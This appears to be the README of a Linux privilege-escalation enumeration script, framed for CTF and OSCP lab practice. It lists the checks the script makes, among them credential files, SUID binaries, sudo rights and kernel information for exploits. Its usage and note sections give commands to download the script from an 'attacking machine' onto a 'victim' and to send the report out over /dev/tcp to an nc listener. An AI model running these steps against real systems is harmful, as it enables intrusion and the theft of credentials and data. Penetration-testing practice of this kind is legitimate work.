# LINUX PRIVILEGE ESCALATION SCRIPT

This script has been written from experiences. As far as I was rooting linux box, I was adding the new way to detect the escalation privileges. 

**The strength of this script is the fact it doesn't only print information, it does an automatic analysis of information printed in order to show ony the relevant information.**

The script does the following actions

- [x] Print Network Interface configuration
- [x] Locate database config file in /var/www
- [x] Print potentials file containing password in /home or in /var/www
- [x] Check any .htpasswd file
- [x] Check credentials file in /etc/fstab
- [x] Check readable mail
- [x] Check last 10 min file edited **(Information useful for cron jobs)**
- [x] Check relevant processes and sort them by users
- [x] Check users and tell which one have root privileges except the standard root user
- [x] Print root files that can be read and those than can be written  
- [x] Print all readable files in /home
- [x] Check writable configuration files 
- [x] Print non default content of /etc/crontab (to avoid overwhelming information)
- [x] Check sudo rights of the current user
- [x] Check some vulnerable software like chkrootkit and snap
- [x] Print **uncommon** suid file (The default suid program like ping are removed)
- [x] Check LD_PRELOAD
- [x] Check program with capabilities 
- [x] Check docker users
- [x] Check lxd users
- [x] Check users with multiples groups
- [x] Check database version by submitting default credentials 
- [x] Check if mysql is running with root user
- [x] Check last login 
- [x] Print global listening connexion and local listening connexion **(relevant information of port forwaring)**
- [x] Print system information for kernel exploit
- [x] List installed compilers for eventual kernel exploit

## Usage 
There are many ways easy to run this script. 
1. Download it and host it in your attacking machine 
2. Download it from you attacking machine and run. Assuming you attacker machine is 192.168.43.1, 
	1. You can open a web server doing `sudo python3 -m http.server 80`
	2. Run it on your victim machine doing 
	```
	cd \tmp
	wget 192.168.43.1\linuxprivesc.sh
	bash linuxprivesc.sh > report.txt
	```

## Note
You don't have to direct the output in report.txt but I higly recommend it for analysis purpose. You can upload it back on your attacking machine by doing the following 
```
#On your atracking machine 
nc -nlvp 1111 > report.txt

#On your victim machine
cat report.txt > /dev/tcp/192.168.43.1/1111
```

**Remember to change the IP address by your own IP address**

*Sometimes some directories are printed in the repo.txt while they are not too useful. For example too many logs from /snap/ or bunch of files in /var/www/. When this happen just do the following:*

Taking example of /snap/ `cat report.txt | grep -v '/snap/' > report_clean.txt` 

Assuming you have many directories that you want to remove (Ex: /var/www/html, /snap/), you can do it in one command `cat report.txt | grep -v '/snap/\|/var/www/html' > report_clean.txt`

As said previously, this script has been written from experiences. I've root more that 100 machines on vulhub and more than 50 on HackTheBox. You can check my HackTheBox profile [here](https://www.hackthebox.eu/home/users/profile/171842). 


## Test your privesc skills  with this script on the folowing boxes (good for OSCP preparation) 
- https://github.com/Ignitetechnologies/Web-Application-Cheatsheet/blob/master/README.md

- https://www.hackingarticles.in/privilege-escalation-cheatsheet-vulnhub/

- https://github.com/Ignitetechnologies/Privilege-Escalation



## References
- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/rebootuser/LinEnum
- https://github.com/AlessandroZ/BeRoot
- https://github.com/sleventyeleven/linuxprivchecker
- https://github.com/pentestmonkey/unix-privesc-check 

